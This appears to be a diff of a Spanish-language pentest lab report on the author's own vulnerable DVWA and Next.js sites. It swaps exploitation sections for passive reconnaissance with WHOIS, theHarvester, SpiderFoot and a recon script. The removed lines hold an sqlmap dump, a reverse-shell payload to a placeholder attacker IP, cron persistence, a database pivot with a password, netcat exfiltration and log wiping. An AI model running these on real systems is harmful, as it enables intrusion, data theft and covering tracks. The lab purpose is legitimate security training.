-                    <ol class="list-decimal pl-5 space-y-2 text-sm text-slate-700">
-                        <li>Acceso al parámetro vulnerable de DVWA con cookie de sesión.</li>
-                        <li>Ejecución de <strong>SQLMap</strong> para volcar las bases de datos de MariaDB:</li>
-                    </ol>
-
+                <div>
+                    <h4 class="font-bold text-slate-900">4.1 WHOIS — Error de Solicitud en Subdominios</h4>
+                    <p class="text-sm text-slate-700 mt-1">Se intentó registrar la titularidad o la geolocalización administrativa del dominio a través de WHOIS clásico.</p>
                     <div class="code-shell mt-3">
                         <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                            <span>sqlmap</span>
-                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-sqlmap')">Copiar</button>
+                            <span>Terminal Kali Linux</span>
+                            <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-whois')">Copiar</button>
                         </div>
-                        <pre id="code-sqlmap" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion_cookie" --batch --dbs</code></pre>
+                        <pre id="code-whois" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>whois webinsegura1.duckdns.org</code></pre>
                     </div>
 
-                    # aqui agrega la captura burpsuite.png con descripcion
-                    # aqui agrega la captura sqlmap_db.png con descripcion
-                    # aqui agrega la captura log_wazuh_sqli.png con descripcion
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Error de WHOIS — Malformed Request:</strong> El servidor WHOIS del TLD `.org` responde con un error <em>Malformed request</em> o <em>No match</em>. La estructura DNS de DuckDNS no genera registros WHOIS individuales para los subdominios de sus usuarios. Toda consulta WHOIS debe realizarse estrictamente contra el dominio raíz <code>duckdns.org</code>, que revela la titularidad genérica del servicio mas no del host del laboratorio.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="pt-4 border-t border-slate-100">
+                    <h4 class="font-bold text-slate-900">4.2 theHarvester — Limitación de OSINT en Motores de Búsqueda</h4>
+                    <p class="text-sm text-slate-700">Intento de enumerar correos electrónicos corporativos, subdominios adicionales e IPs expuestas en fuentes indexadas de Google y Bing.</p>
+                    
+                    <div class="mt-4">
+                        <img src="../assets/reco1/image7.png" alt="Ejecución de theHarvester sin resultados" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 7: Comando theHarvester en ejecución retornando 0 resultados o "Invalid source" en consultas pasivas.</p>
+                    </div>
+
+                    <!-- Incidencia -->
+                    <div class="warning-box">
+                        <div class="warning-box-header">Incidencias ⚠️</div>
+                        <div class="warning-box-content">
+                            <p><strong>Ausencia de Trazas Indexadas:</strong> Las consultas automatizadas a buscadores no reportan ninguna dirección de correo ni subdominios relacionados. Dado que los subdominios dinámicos no forman parte de una empresa con presencia web corporativa, los rastreadores de Google y Bing no tienen metadatos, foros ni listas indexadas de los mismos, haciendo inviable la obtención de información útil por OSINT.</p>
+                        </div>
+                    </div>
                 </div>
             </section>
 
-            <section id="rce" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
-                <h3 class="text-2xl font-bold text-slate-950">4. Vector 2: RCE React2Shell</h3>
-                <p class="mt-3 leading-8 text-slate-700">Aprovechamiento de la deserialización de RSC en Next.js para ejecutar comandos del sistema e instanciar una shell reversa.</p>
+            <!-- SpiderFoot -->
+            <section id="spiderfoot" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <div>
+                    <h3 class="text-2xl font-bold text-slate-950">🟪 5. SpiderFoot — Comparativa de Exposición de Nodos</h3>
+                    <p class="text-sm text-slate-600 mt-1">Análisis automatizado pasivo de la superficie digital a través de correlación de fuentes abiertas.</p>
+                </div>
 
-                <div class="mt-6 space-y-6">
-                    <div>
-                        <h4 class="font-bold text-slate-900">1. Servidor de Escucha Netcat</h4>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Terminal Kali Linux (Escucha)</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-netcat')">Copiar</button>
-                            </div>
-                            <pre id="code-netcat" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>nc -lvnp 4444</code></pre>
-                        </div>
+                <div>
+                    <h4 class="font-bold text-slate-900">5.1 Análisis Comparativo de Superficie Técnica (5 vs 40 Nodos)</h4>
+                    <p class="text-sm text-slate-700 leading-8">
+                        Se implementó una comparación tabular de la densidad de nodos obtenidos de forma pasiva por SpiderFoot entre ambas configuraciones web para contrastar la visibilidad de cada una de ellas:
+                    </p>
+
+                    <div class="overflow-x-auto mt-4">
+                        <table class="min-w-full divide-y divide-slate-200 text-sm">
+                            <thead>
+                                <tr>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Entorno Objetivo</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Nodos Detectados</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Naturaleza de los Nodos</th>
+                                    <th class="px-4 py-3 font-bold text-slate-900 bg-slate-50">Conclusión de Exposición</th>
+                                </tr>
+                            </thead>
+                            <tbody class="divide-y divide-slate-100">
+                                <tr>
+                                    <td class="px-4 py-3 font-semibold text-slate-900">webinsegura2 (DVWA)</td>
+                                    <td class="px-4 py-3 font-bold text-amber-700 text-center">5 Nodos</td>
+                                    <td class="px-4 py-3 text-slate-700">Registros MX, Internet Name (alias) y Raw DNS.</td>
+                                    <td class="px-4 py-3 text-slate-700">Entorno estático y aislado. Sin librerías externas ni referencias de JS complejas. Huella digital sumamente reducida.</td>
+                                </tr>
+                                <tr>
+                                    <td class="px-4 py-3 font-semibold text-slate-900">webinsegura1 (Next.js)</td>
+                                    <td class="px-4 py-3 font-bold text-orange-600 text-center">40 Nodos (31 Únicos)</td>
+                                    <td class="px-4 py-3 text-slate-700">Múltiples JS de soporte, metadatos, cookies de sesión, NS asociados al dominio raíz, y subdominios del proveedor DNS.</td>
+                                    <td class="px-4 py-3 text-slate-700">Arquitectura dinámica moderna. Expone metadatos de configuración, librerías del cliente y cabeceras que delatan su infraestructura interna.</td>
+                                </tr>
+                            </tbody>
+                        </table>
                     </div>
 
-                    <div>
-                        <h4 class="font-bold text-slate-900">2. Disparo de exploit por deserialización RSC</h4>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Terminal Kali Linux (Ataque)</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-exploit')">Copiar</button>
-                            </div>
-                            <pre id="code-exploit" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>curl -X POST -H "Content-Type: text/x-component" --data-binary $'1:I\n2:O{"command": "bash -c \'bash -i >& /dev/tcp/IP_PUBLICA_ATACANTE/4444 0>&1\'"}' https://webinsegura1.duckdns.org/api/rsc -k</code></pre>
-                        </div>
-                    </div>
+                    <p class="text-sm text-slate-700 mt-4 leading-8">
+                        Se optó por una representación tabular en lugar de una gráfica debido a la alta densidad de nodos en el entorno Next.js, priorizando la claridad y la comparación directa de la superficie de exposición técnica frente a entornos minimalistas.
+                    </p>
+                </div>
 
-                    # aqui agrega la captura netcat_shell.png con descripcion
-                    # aqui agrega la captura log_wazuh_rce.png con descripcion
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pt-4 border-t border-slate-100">
+                    <div>
+                        <h5 class="font-bold text-slate-900 mb-2">Escaneo de webinsegura2 (DVWA)</h5>
+                        <img src="../assets/reco1/image8.png" alt="Spiderfoot webinsegura2" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 8: Grafo en SpiderFoot mostrando un número mínimo de elementos detectados (5).</p>
+                    </div>
+                    <div>
+                        <h5 class="font-bold text-slate-900 mb-2">Escaneo de webinsegura1 (Next.js)</h5>
+                        <img src="../assets/reco1/image9.png" alt="Spiderfoot webinsegura1" class="rounded-xl border border-slate-200 shadow-sm max-w-full">
+                        <p class="text-xs text-slate-500 mt-2 text-center">Captura 9: Grafo denso en SpiderFoot correspondiente al entorno dinámico de Next.js (40).</p>
+                    </div>
+                </div>
+
+                <!-- Incidencia -->
+                <div class="warning-box">
+                    <div class="warning-box-header">Incidencias ⚠️</div>
+                    <div class="warning-box-content">
+                        <p><strong>Timeouts de Red en Módulos Spiderfoot:</strong> Durante el escaneo pasivo de ambos dominios, SpiderFoot registró alertas y fallas con mensajes del tipo <code>Unable to SSL-connect... (timed out)</code> y <code>Failed to obtain DNS response (timed out)</code>. Esto corrobora la inestabilidad de resolución del servicio gratuito de DuckDNS cuando es sometido a peticiones paralelas originadas por el rastreo modular.</p>
+                    </div>
                 </div>
             </section>
 
-            <section id="post" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
-                <h3 class="text-2xl font-bold text-slate-950">5. Post-Explotación</h3>
-                <p class="mt-3 leading-8 text-slate-700">Técnicas defensivas e intrusivas llevadas a cabo una vez controlada la terminal remota del contenedor.</p>
-
-                <div class="mt-6 space-y-6">
-                    <div>
-                        <h4 class="font-bold text-slate-900">1. Persistencia (Cronjob)</h4>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Contenedor Comprometido</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-persist')">Copiar</button>
-                            </div>
-                            <pre id="code-persist" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>(crontab -l ; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/IP_PUBLICA_ATACANTE/4444 0>&1'") | crontab -</code></pre>
-                        </div>
-                    </div>
-
-                    # aqui agrega la captura cronjob.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">2. Movimiento Lateral (Pivoteo a Base de Datos)</h4>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Contenedor Comprometido</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-pivoting')">Copiar</button>
-                            </div>
-                            <pre id="code-pivoting" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>mysql -h 172.30.0.5 -u db_modern_user -pInsecureAIPassword_123 -e "SHOW DATABASES; USE lab_modern_db; SELECT * FROM users;"</code></pre>
-                        </div>
-                    </div>
-
-                    # aqui agrega la captura db_pivoting.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">3. Exfiltración de Datos (Vía Netcat)</h4>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Contenedor Comprometido</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-exfiltration')">Copiar</button>
-                            </div>
-                            <pre id="code-exfiltration" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>tar -czf - /var/lib/mysql | nc IP_PUBLICA_ATACANTE 5555</code></pre>
-                        </div>
-                    </div>
-
-                    # aqui agrega la captura exfiltration.png con descripcion
-
-                    <div>
-                        <h4 class="font-bold text-slate-900">4. Limpieza de Huellas (Covering Tracks)</h4>
-                        <div class="code-shell mt-3">
-                            <div class="flex items-center justify-between gap-4 border-b border-slate-200 px-4 py-3 text-xs text-slate-600">
-                                <span>Contenedor Comprometido</span>
-                                <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1.5 text-emerald-900" onclick="copyCode(this, 'code-covering')">Copiar</button>
-                            </div>
-                            <pre id="code-covering" class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>sed -i '/IP_PUBLICA_ATACANTE/d' /var/log/nginx/access.log</code></pre>
-                        </div>
-                    </div>
-
-                    # aqui agrega la captura clearing.png con descripcion
+            <!-- Guía de Ejecución de Script -->
+            <section id="guia-script" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20 space-y-6">
+                <div>
+                    <h3 class="text-2xl font-bold text-slate-950">🚀 6. Guía de Ejecución de auditor_seguridad.sh en Kali Linux</h3>
+                    <p class="text-sm text-slate-600 mt-1">Pasos detallados para transferir y ejecutar el script de automatización pasiva directamente en tu terminal de Kali.</p>
                 </div>
-            </section>
 
-            <section id="informe" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-300/20">
-                <h3 class="text-2xl font-bold text-slate-950">6. Informe de Pentest Redactado</h3>
-                <p class="mt-3 leading-8 text-slate-700">Integración de todos los vectores auditados en un reporte final detallando mitigación, severidad y pasos de remediación.</p>
-                <div class="mt-4 space-y-4 text-sm leading-7 text-slate-700">
-                    <p><strong>Resumen Ejecutivo:</strong> Diseñado para proveer una visión global de la superficie de ataque comprometida del laboratorio al CISO.</p>
-                    <p><strong>Metodología:</strong> Detalle del cumplimiento de los estándares PTES y OSSTMM (reconocimiento pasivo/activo, escaneos de vulnerabilidades, explotación RCE/SQLi y post-explotación).</p>
-                    <p><strong>Remediación Recomendada:</strong> Parchear las dependencias vulnerables de Next.js a la versión <code>15.5.7</code> o superior, y sanear los parámetros de consulta SQL de DVWA.</p>
+                <div class="space-y-4">
+                    <div>
+                        <h4 class="font-bold text-slate-900">Paso 1: Crear o transferir el script a Kali Linux</h4>
+                        <p class="text-sm text-slate-700 mt-1">Puedes transferirlo de dos maneras sencillas:</p>
+                        <ul class="list-disc pl-5 mt-2 space-y-2 text-xs text-slate-700">
+                            <li><strong>Opción A (Copiar y Pegar):</strong> Abre una terminal en Kali Linux, ejecuta <code>nano auditor_seguridad.sh</code>, copia el código que figura arriba en la sección de metodología y pégalo. Presiona <code>Ctrl+O</code>, <code>Enter</code> y <code>Ctrl+X</code> para guardar y salir.</li>
+                            <li><strong>Opción B (Servidor HTTP local):</strong> Lanza un servidor Python temporal desde la máquina host de Windows en la carpeta de reconocimiento:
+                                <div class="code-shell mt-2">
+                                    <pre class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>python -m http.server 8000</code></pre>
+                                </div>
+                                Y recupéralo en tu Kali ejecutando:
+                                <div class="code-shell mt-2">
+                                    <pre class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>wget http://[IP_DE_WINDOWS]:8000/auditor_seguridad.sh</code></pre>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <div class="pt-4 border-t border-slate-100">
+                        <h4 class="font-bold text-slate-900">Paso 2: Otorgar permisos de ejecución</h4>
+                        <p class="text-sm text-slate-700 mt-1">Asigna privilegios de ejecución al script en la terminal de Kali:</p>
+                        <div class="code-shell mt-2">
+                            <pre class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>chmod +x auditor_seguridad.sh</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="pt-4 border-t border-slate-100">
+                        <h4 class="font-bold text-slate-900">Paso 3: Lanzar el Script</h4>
+                        <p class="text-sm text-slate-700 mt-1">Ejecuta el script de automatización:</p>
+                        <div class="code-shell mt-2">
+                            <pre class="overflow-x-auto p-4 text-sm leading-7 text-slate-900"><code>./auditor_seguridad.sh</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="pt-4 border-t border-slate-100 bg-slate-50 p-4 rounded-xl">
+                        <h4 class="font-bold text-slate-900">Estructura del Reporte de Salida</h4>
+                        <p class="text-xs text-slate-600 mt-1">El script generará de forma automática la siguiente estructura organizada por subcarpetas:</p>
+                        <pre class="mt-2 text-xs leading-6 text-slate-800">
+reporte_reconocimiento/
+├── webinsegura1.duckdns.org/
+│   ├── dns_a.txt          # Registro IP pública
+│   ├── dns_mx.txt         # MX genérico
+│   ├── dns_ns.txt         # Servidores NS
+│   ├── headers.txt        # Cabeceras HTTP de Next.js
+│   └── tecnologias.txt    # Fingerprint de WhatWeb
+└── webinsegura2.duckdns.org/
+    ├── dns_a.txt
+    ├── dns_mx.txt
+    ├── dns_ns.txt
+    ├── headers.txt        # Cabeceras HTTP de DVWA/Apache
+    └── tecnologias.txt    # Fingerprint de WhatWeb (PHP, Apache)
+                        </pre>
+                    </div>
                 </div>
             </section>
         </section>
